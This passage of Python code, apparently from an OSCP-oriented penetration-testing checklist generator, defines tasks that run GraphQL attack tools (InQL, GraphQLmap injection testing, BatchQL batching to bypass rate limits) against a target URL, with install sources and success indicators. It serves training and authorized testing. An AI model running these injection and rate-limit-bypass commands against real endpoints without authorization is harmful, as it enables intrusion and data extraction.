                'flag_explanations': {
                    'inql': 'Advanced GraphQL testing tool (successor to standalone InQL)',
                    '-t': 'Target endpoint',
                    '-o': 'Output directory for generated queries'
                },
                'success_indicators': [
                    'Queries auto-generated',
                    'Mutations discovered',
                    'Complete attack surface mapped'
                ],
                'failure_indicators': [
                    'Tool not installed',
                    'Introspection required',
                    'Connection error'
                ],
                'next_steps': [
                    'Review generated queries in output dir',
                    'Test high-value mutations',
                    'Run batch attacks with InQL Attacker mode'
                ],
                'alternatives': [
                    'Install: pip install inql',
                    'Burp extension: InQL v5.0 (Scanner + Attacker)',
                    'Manual query generation from schema',
                    'GraphQL Voyager for visual exploration'
                ],
                'notes': 'InQL is powerful for OSCP - auto-generates all attack vectors from schema'
            }
        })

        # Task 8.2: GraphQLmap
        tools_tasks['children'].append({
            'id': f'graphql-map-{port}',
            'name': 'GraphQLmap (Automated Attacks)',
            'type': 'command',
            'metadata': {
                'command': f'python3 graphqlmap.py -u {base_url}/graphql --inject',
                'description': 'Automated GraphQL injection testing (SQLi, NoSQLi, etc.)',
                'tags': ['OSCP:LOW', 'AUTOMATED', 'EXPLOIT'],
                'flag_explanations': {
                    'graphqlmap': 'GraphQL exploitation tool',
                    '-u': 'Target URL',
                    '--inject': 'Test for injection vulnerabilities'
                },
                'success_indicators': [
                    'Injection vulnerabilities found',
                    'Data extracted',
                    'Successful exploitation'
                ],
                'alternatives': [
                    'Install: git clone https://github.com/swisskyrepo/GraphQLmap',
                    'Manual injection testing',
                    'SQLmap against GraphQL endpoint'
                ],
                'notes': 'Good for automated testing but understand manual techniques first (OSCP focus)'
            }
        })

        # Task 8.3: BatchQL
        tools_tasks['children'].append({
            'id': f'graphql-batchql-{port}',
            'name': 'BatchQL (Batch Attack Automation)',
            'type': 'command',
            'metadata': {
                'command': f'batchql -u {base_url}/graphql -q queries.txt',
                'description': 'Automate batch GraphQL queries and mutations',
                'tags': ['OSCP:LOW', 'AUTOMATED', 'BRUTE_FORCE'],
                'flag_explanations': {
                    'batchql': 'GraphQL batching attack tool',
                    '-u': 'GraphQL endpoint',
                    '-q': 'File with queries to batch'
                },
                'success_indicators': [
                    'Batch queries executed',
                    'Rate limits bypassed',
                    'Multiple results in single request'
                ],
                'alternatives': [
                    'Install: git clone https://github.com/assetnote/batchql',
                    'Manual batching with curl',
                    'Python script to generate batch payloads'
                ],
                'notes': 'Batching is core OSCP technique - understand manual method first'
            }
        })

        tasks['children'].append(tools_tasks)

        return tasks
